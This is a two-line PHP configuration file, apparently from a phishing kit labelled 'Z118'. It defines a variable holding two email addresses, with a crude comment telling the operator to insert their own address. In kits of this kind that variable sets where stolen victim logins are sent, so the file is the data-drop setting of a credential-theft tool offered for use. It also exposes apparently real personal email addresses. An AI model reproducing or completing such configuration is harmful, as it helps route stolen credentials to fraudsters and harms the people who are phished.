<?php

$Z118_EMAIL = "kunchonghipulini@yahoo.com,kunchonghipulini@yandex.com"; // PUT UR FUCKING E-MAIL BRO
?>
